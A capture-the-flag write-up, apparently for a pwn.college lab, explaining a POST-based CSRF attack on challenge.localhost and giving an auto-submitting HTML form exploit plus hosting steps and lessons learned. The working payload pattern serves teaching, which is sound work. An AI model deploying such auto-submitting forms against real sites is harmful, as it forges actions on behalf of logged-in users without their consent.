## 🧨 Challenge: POST-based CSRF Attack

### 📜 Description

The challenge builds on the previous level, which required crafting a GET-based CSRF exploit. This time, the goal is to perform a **CSRF attack using a POST request** against a vulnerable server (`challenge.localhost`). JavaScript **cannot send cross-origin requests** due to the Same-Origin Policy (SOP), but browsers **can still submit HTML forms cross-origin**, and cookies will be included automatically — which is the vulnerability we exploit here.

### 🎯 Goal

Trigger a POST request to the vulnerable endpoint (e.g., `/post` or `/publish`) with valid form data on behalf of an authenticated user, **without their interaction**.

---

## 🧪 Vulnerability Explanation

* The server **does not implement CSRF protection**, like anti-CSRF tokens.
* The POST route (e.g., `/post`, `/publish`, `/update`) **uses only session cookies** to authenticate the request.
* Since the victim is logged in, their browser will **include the session cookie** in a cross-origin form submission.
* Browsers **do not block form submissions** from foreign origins; they only prevent **reading** the response (SOP).
* We exploit this by building a form that submits automatically using JavaScript.

---

## ⚙️ Exploit Code (`index.html`)

```html
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://challenge.localhost/post" method="POST">
      <input type="hidden" name="content" value="CSRF Attack! 🐍 pwn.college{csrf_flag}">
    </form>

    <script>
      // Automatically submit the form on page load
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

> ☑️ This HTML file must be named `index.html` to load automatically when `http://hacker.localhost:1337/` is visited.

---

## 🧰 Exploitation Steps

1. **Host the exploit**:

   ```bash
   python3 -m http.server 1337
   ```

2. **Place `index.html`** in the same directory as the web server.

3. **Visit** `http://hacker.localhost:1337` **in the same browser** where you’re already logged in as a victim on `http://challenge.localhost`.

4. **Observe** the result (e.g., a new post was created, or a change was made).

---

## ✅ Why It Works

* `<form method="POST">` submissions **bypass SOP** restrictions.
* The victim’s browser **automatically attaches cookies** for `challenge.localhost`.
* JavaScript on the attacker’s page **can submit the form** — this is **allowed**, because the origin of the request is the form’s action URL, not the script’s.

---

## 🧠 Lessons Learned

* **Forms are dangerous** when not protected by CSRF tokens.
* CSRF can be triggered by auto-submitted forms — no user interaction needed.
* SOP does **not** block sending data — it blocks **reading** the response.

---

## 🏁 Flag

Once the form submission is successful, the server should expose the flag or perform the intended action. If the flag is shown in the response or on the victim’s dashboard, you can retrieve it accordingly.
